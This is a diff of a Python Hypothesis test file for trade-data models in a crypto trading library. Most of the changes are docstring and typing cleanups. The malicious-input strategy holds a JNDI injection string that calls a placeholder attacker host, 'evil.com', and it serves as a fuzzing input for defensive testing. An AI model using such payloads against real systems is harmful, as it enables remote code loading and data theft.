@@ -18,7 +18,7 @@ from decimal import Decimal
 from typing import Any
 
 import pytest
-from hypothesis import given, strategies as st, assume
+from hypothesis import assume, given, strategies as st
 from hypothesis.strategies import SearchStrategy
 from pydantic import ValidationError
 
@@ -45,11 +45,15 @@ from cyberdelta.exceptions.parsing import (
 
 
 def trade_decimal_strategy() -> SearchStrategy[str]:
-    """Generate decimal strings for trade financial fields."""
+    """Generate decimal strings for trade financial fields.
+
+    Returns:
+        A Hypothesis strategy for decimal strings used in trading operations.
+    """
     return st.one_of([
         # Trading price/quantity amounts
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("10000000"), places=8).map(str),
-        st.decimals(min_value=Decimal("0"), max_value=Decimal("1000000"), places=6).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(10000000), places=8).map(str),
+        st.decimals(min_value=Decimal(0), max_value=Decimal(1000000), places=6).map(str),
         # Common trading values
         st.just("0"),
         st.just("0.0"),
@@ -65,7 +69,11 @@ def trade_decimal_strategy() -> SearchStrategy[str]:
 
 
 def trading_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid trading symbol strings."""
+    """Generate valid trading symbol strings.
+
+    Returns:
+        A Hypothesis strategy for valid trading symbol strings.
+    """
     return st.one_of([
         # Common trading pairs
         st.sampled_from(["BTC_USDC", "ETH_USDC", "SOL_USDC", "AVAX_USDC", "ARB_USDC"]),
@@ -85,7 +93,11 @@ def trading_symbol_strategy() -> SearchStrategy[str]:
 
 
 def trade_id_strategy() -> SearchStrategy[str]:
-    """Generate valid trade ID strings."""
+    """Generate valid trade ID strings.
+
+    Returns:
+        A Hypothesis strategy for valid trade ID strings.
+    """
     return st.one_of([
         # Common formats
         st.text(
@@ -111,7 +123,11 @@ def trade_id_strategy() -> SearchStrategy[str]:
 
 
 def order_id_strategy() -> SearchStrategy[str]:
-    """Generate valid order ID strings."""
+    """Generate valid order ID strings.
+
+    Returns:
+        A Hypothesis strategy for valid order ID strings.
+    """
     return st.one_of([
         # Common formats
         st.text(
@@ -134,8 +150,12 @@ def order_id_strategy() -> SearchStrategy[str]:
     ])
 
 
-def timestamp_strategy() -> SearchStrategy[Any]:
-    """Generate valid timestamp values."""
+def timestamp_strategy() -> SearchStrategy[object]:
+    """Generate valid timestamp values.
+
+    Returns:
+        A Hypothesis strategy for valid timestamp values.
+    """
     return st.one_of([
         # Unix timestamps (milliseconds)
         st.integers(min_value=1000000000000, max_value=2000000000000),
@@ -154,12 +174,20 @@ def timestamp_strategy() -> SearchStrategy[Any]:
 
 
 def side_strategy() -> SearchStrategy[str]:
-    """Generate valid order side strings."""
+    """Generate valid order side strings.
+
+    Returns:
+        A Hypothesis strategy for valid order side strings.
+    """
     return st.sampled_from(["Bid", "Ask"])
 
 
 def fee_symbol_strategy() -> SearchStrategy[str]:
-    """Generate valid fee symbol strings."""
+    """Generate valid fee symbol strings.
+
+    Returns:
+        A Hypothesis strategy for valid fee symbol strings.
+    """
     return st.one_of([
         # Common fee symbols
         st.sampled_from(["USDC", "USDT", "BTC", "ETH", "SOL"]),
@@ -175,8 +203,12 @@ def fee_symbol_strategy() -> SearchStrategy[str]:
 
 
 @st.composite
-def valid_public_trade_data(draw) -> dict[str, Any]:
-    """Generate valid public trade data structure."""
+def valid_public_trade_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid public trade data structure.
+
+    Returns:
+        A dictionary with valid public trade data fields.
+    """
     return {
         "id": draw(trade_id_strategy()),
         "orderId": draw(order_id_strategy()),
@@ -188,8 +220,12 @@ def valid_public_trade_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_recent_public_trade_data(draw) -> dict[str, Any]:
-    """Generate valid recent public trade data structure."""
+def valid_recent_public_trade_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid recent public trade data structure.
+
+    Returns:
+        A dictionary with valid recent public trade data fields.
+    """
     return {
         "id": draw(st.integers(min_value=0, max_value=2**31 - 1)),
         "isBuyerMaker": draw(st.booleans()),
@@ -201,8 +237,12 @@ def valid_recent_public_trade_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_trade_event_data(draw) -> dict[str, Any]:
-    """Generate valid trade event data structure."""
+def valid_trade_event_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid trade event data structure.
+
+    Returns:
+        A dictionary with valid trade event data fields.
+    """
     return {
         "e": "trade",
         "E": draw(timestamp_strategy()),
@@ -218,8 +258,12 @@ def valid_trade_event_data(draw) -> dict[str, Any]:
 
 
 @st.composite
-def valid_fill_response_data(draw) -> dict[str, Any]:
-    """Generate valid fill response data structure."""
+def valid_fill_response_data(draw: st.DrawFn) -> dict[str, Any]:
+    """Generate valid fill response data structure.
+
+    Returns:
+        A dictionary with valid fill response data fields.
+    """
     return {
         "fee": draw(trade_decimal_strategy()),
         "feeSymbol": draw(fee_symbol_strategy()),
@@ -246,8 +290,12 @@ def valid_fill_response_data(draw) -> dict[str, Any]:
     }
 
 
-def malicious_trade_strategy() -> SearchStrategy[Any]:
-    """Generate malicious strings for trade security testing."""
+def malicious_trade_strategy() -> SearchStrategy[object]:
+    """Generate malicious strings for trade security testing.
+
+    Returns:
+        A Hypothesis strategy for malicious values to test security boundaries.
+    """
     return st.one_of([
         # Financial manipulation attempts
         st.just("${jndi:ldap://evil.com/steal-trades}"),
@@ -280,8 +328,12 @@ def malicious_trade_strategy() -> SearchStrategy[Any]:
     ])
 
 
-def invalid_trade_type_strategy() -> SearchStrategy[Any]:
-    """Generate invalid types for trade field validation testing."""
+def invalid_trade_type_strategy() -> SearchStrategy[object]:
+    """Generate invalid types for trade field validation testing.
+
+    Returns:
+        A Hypothesis strategy for invalid types to test field validation.
+    """
     return st.one_of([
         st.none(),
         st.integers(),
@@ -347,10 +399,10 @@ class TestBackpackRawPublicTradeProperties:
         malicious_value=malicious_trade_strategy(),
     )
     def test_public_trade_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Public trade model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | int | object] = {
             "id": "trade_123",
             "orderId": "order_456",
             "symbol": "BTC_USDC",
@@ -376,9 +428,11 @@ class TestBackpackRawPublicTradeProperties:
         field_name=st.sampled_from(["id", "orderId", "symbol", "price", "time"]),
         invalid_value=invalid_trade_type_strategy(),
     )
-    def test_public_trade_type_safety_properties(self, field_name: str, invalid_value: Any) -> None:
+    def test_public_trade_type_safety_properties(
+        self, field_name: str, invalid_value: object
+    ) -> None:
         """Property: Public trade model should enforce strict type safety."""
-        base_data = {
+        base_data: dict[str, str | int | object] = {
             "id": "trade_123",
             "orderId": "order_456",
             "symbol": "BTC_USDC",
@@ -536,10 +590,10 @@ class TestBackpackRawPublicTradeEventProperties:
         malicious_value=malicious_trade_strategy(),
     )
     def test_trade_event_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Trade event model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | int | bool | object] = {
             "e": "trade",
             "E": 1678886400000,
             "s": "BTC_USDC",
@@ -663,10 +717,10 @@ class TestBackpackRawFillResponseProperties:
         malicious_value=malicious_trade_strategy(),
     )
     def test_fill_response_security_boundary_properties(
-        self, field_name: str, malicious_value: Any
+        self, field_name: str, malicious_value: object
     ) -> None:
         """Property: Fill response model should reject malicious inputs safely."""
-        base_data = {
+        base_data: dict[str, str | bool | int | object] = {
             "fee": "0.001",
             "feeSymbol": "USDC",
             "isMaker": True,
